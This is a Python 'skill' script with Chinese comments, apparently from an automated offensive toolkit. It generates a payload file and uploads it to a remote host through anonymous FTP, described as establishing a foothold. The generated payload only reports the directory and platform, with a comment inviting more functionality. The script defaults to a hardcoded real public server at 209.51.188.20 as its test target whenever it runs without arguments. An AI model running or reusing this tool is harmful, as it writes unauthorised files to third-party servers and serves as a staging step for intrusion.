"""skill/deploy_remote_ftp_v4.py - 通过匿名FTP部署payload到远程主机，建立据点

SKILL_META:
{
  "name": "deploy_remote_ftp_v4",
  "description": "通过匿名FTP部署payload到远程主机，建立据点",
  "category": "deploy",
  "test_target": "209.51.188.20:21 的匿名FTP服务器",
  "test_args": "--host 209.51.188.20 --port 21 --directory /pub --payload_name my_payload.py",
  "version": "1.0"
}
"""
from __future__ import annotations

import argparse
import json
import sys
import tempfile
from pathlib import Path
from typing import Any

try:
    from upload_ftp_anon_dir import main as upload_ftp_anon_dir_run
except ImportError:
    upload_ftp_anon_dir_run = None

def generate_simple_payload(payload_name: str) -> Path:
    """生成一个简单的Python payload文件"""
    payload_content = '''#!/usr/bin/env python3
print("Payload executed successfully")
# 这里可以添加更多功能
import os
print(f"Current directory: {os.getcwd()}")
print(f"Platform: {os.uname() if hasattr(os, 'uname') else os.name}")
'''

    temp_dir = Path(tempfile.mkdtemp())
    payload_path = temp_dir / payload_name

    with open(payload_path, 'w', encoding='utf-8') as f:
        f.write(payload_content)

    # 设置执行权限
    payload_path.chmod(0o755)

    return payload_path

def main(
    host: str,
    port: int,
    directory: str,
    payload_name: str = 'my_payload.py'
) -> dict[str, Any]:
    results: dict[str, Any] = {"success": False, "message": "", "data": {}}

    try:
        if upload_ftp_anon_dir_run is None:
            raise ImportError("依赖工具 upload_ftp_anon_dir 不可用")

        # 1. 生成payload文件
        payload_path = generate_simple_payload(payload_name)
        results["data"]["payload_path"] = str(payload_path)
        results["data"]["payload_name"] = payload_name

        # 2. 上传到FTP服务器
        upload_result = upload_ftp_anon_dir_run(
            host=host,
            port=port,
            directory=directory,
            local_file=str(payload_path)
        )

        if not upload_result.get("success", False):
            raise RuntimeError(f"FTP上传失败: {upload_result.get('message', '未知错误')}")

        # 3. 清理临时文件
        try:
            payload_path.parent.rmdir()
        except OSError:
            pass

        results["success"] = True
        results["message"] = f"Payload '{payload_name}' 已成功部署到 {host}:{port}{directory}"
        results["data"]["ftp_url"] = f"ftp://{host}:{port}{directory}/{payload_name}"
        results["data"]["upload_result"] = upload_result

    except FileNotFoundError as e:
        results["message"] = f"文件错误: {e}"
    except ConnectionError as e:
        results["message"] = f"连接错误: {e}"
    except PermissionError as e:
        results["message"] = f"权限错误: {e}"
    except ImportError as e:
        results["message"] = f"导入错误: {e}"
    except RuntimeError as e:
        results["message"] = f"运行时错误: {e}"
    except Exception as e:
        results["message"] = f"未知错误: {type(e).__name__}: {e}"

    return results

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="通过匿名FTP部署payload到远程主机")
    parser.add_argument("--host", type=str, required=True, help="FTP服务器主机")
    parser.add_argument("--port", type=int, required=True, help="FTP服务器端口")
    parser.add_argument("--directory", type=str, required=True, help="FTP目录")
    parser.add_argument("--payload_name", type=str, default="my_payload.py", help="payload文件名")

    if len(sys.argv) == 1:
        # 使用测试参数
        args = parser.parse_args([
            "--host", "209.51.188.20",
            "--port", "21",
            "--directory", "/pub",
            "--payload_name", "my_payload.py"
        ])
    else:
        args = parser.parse_args()

    result = main(
        host=args.host,
        port=args.port,
        directory=args.directory,
        payload_name=args.payload_name
    )

    print(json.dumps(result, ensure_ascii=False, indent=2))